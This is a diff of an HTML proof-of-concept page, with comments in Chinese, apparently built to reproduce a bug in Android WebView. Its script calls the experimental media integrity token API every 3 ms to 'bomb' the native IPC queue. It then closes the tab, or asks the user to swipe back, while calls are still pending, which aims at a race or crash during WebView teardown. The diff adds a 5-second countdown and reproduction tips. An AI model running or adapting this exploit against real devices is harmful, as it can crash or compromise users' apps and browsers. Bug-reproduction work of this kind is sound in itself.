@@ -3,21 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>轰炸发射台</title>
+    <title>舒适轰炸发射台</title>
     <style>
         body { font-family: sans-serif; background: #1a1a1a; color: #fff; text-align: center; padding: 30px; }
-        .card { background: #262626; padding: 20px; border-radius: 12px; max-width: 400px; margin: 0 auto; }
-        .btn-fire { width: 100%; padding: 16px; background: #FF3B30; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        .card { background: #262626; padding: 25px; border-radius: 12px; max-width: 450px; margin: 0 auto; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
+        .btn-fire { width: 100%; padding: 16px; background: #FF3B30; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
         .btn-fire:disabled { background: #555; cursor: not-allowed; }
-        .counter { font-size: 32px; color: #FFD60A; font-family: monospace; margin: 20px 0; }
+        .counter { font-size: 36px; color: #FFD60A; font-family: monospace; margin: 15px 0; }
+        .tip { font-size: 13px; color: #FF9500; margin-top: 15px; line-height: 1.5; padding: 10px; background: #332200; border-radius: 6px; border-left: 4px solid #FF9500; text-align: left; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h3>加特林 高频发射中...</h3>
-        <div id="status" style="color: #34C759; font-weight: bold; margin-bottom: 10px;">正在检测 API...</div>
+        <h3>💥 媒体完整性 IPC 轰炸台</h3>
+        <div id="status" style="color: #34C759; font-weight: bold;">正在检测 API...</div>
+        
         <div class="counter" id="count">000000</div>
-        <button class="btn-fire" id="fireBtn" disabled>💥 启动轰炸并自动关闭 Tab</button>
+        
+        <button class="btn-fire" id="fireBtn" disabled>开启轰炸（留出 5 秒侧滑时间）</button>
+        
+        <div class="tip">
+            <strong>💡 最佳复现操作：</strong><br>
+            点击按钮后，计数器会疯狂暴涨。请在倒计时结束前，<strong>随时手动侧滑返回</strong>。5 秒后若无操作，页面才会自动兜底关闭。
+        </div>
     </div>
 
     <script>
@@ -26,7 +34,9 @@
         const countEl = document.getElementById('count');
 
         let total = 0;
-        let timer = null;
+        let bombTimer = null;
+        let countdownTimer = null;
+        let timeLeft = 5; // 🎯 延长到 5 秒，给侧滑留足舒适期
 
         // 1. 验证真身路径
         const hasApi = window.android && window.android.webview && typeof window.android.webview.getExperimentalMediaIntegrityTokenProvider === 'function';
@@ -39,13 +49,13 @@
             statusEl.style.color = "#FF3B30";
         }
 
-        // 2. 轰炸 + 闪现自毁
+        // 2. 轰炸逻辑
         fireBtn.onclick = function() {
             if (!hasApi) return;
             fireBtn.disabled = true;
 
-            // ⚡ 每 3 毫秒盲轰一发，强行塞满原生 IPC 缓冲区
-            timer = setInterval(function() {
+            // ⚡ 每 3 毫秒盲轰一发，高频挤爆 IPC 队列
+            bombTimer = setInterval(function() {
                 total++;
                 countEl.innerText = String(total).padStart(6, '0');
                 
@@ -54,15 +64,26 @@
                 }).catch(() => {});
             }, 3);
 
-            // 🕒 300ms 后准时触发 window.close()
-            // 此时原生层会开始销毁当前 WebView，而 IPC 通道里还留着刚刚发出去的余弹
+            // 🕒 倒计时视觉提示
+            statusEl.style.color = "#FF3B30";
+            statusEl.innerText = `🔥 轰炸中！倒计时 ${timeLeft} 秒自动兜底关闭...`;
+            
+            countdownTimer = setInterval(function() {
+                timeLeft--;
+                if (timeLeft > 0) {
+                    statusEl.innerText = `🔥 轰炸中！倒计时 ${timeLeft} 秒自动兜底关闭...`;
+                } else {
+                    clearInterval(countdownTimer);
+                }
+            }, 1000);
+
+            // 🏁 5000ms 自动兜底自毁
             setTimeout(function() {
-                clearInterval(timer);
-                statusEl.innerText = "⏳ 正在执行原生强杀...";
-                
-                // 🎯 终极杀招：直接调用标准接口关闭窗口，触发原生 view.destroy()
+                clearInterval(bombTimer);
+                clearInterval(countdownTimer);
+                statusEl.innerText = "⏳ 触发自动兜底关闭...";
                 window.close(); 
-            }, 300);
+            }, 5000);
         };
     </script>
 </body>
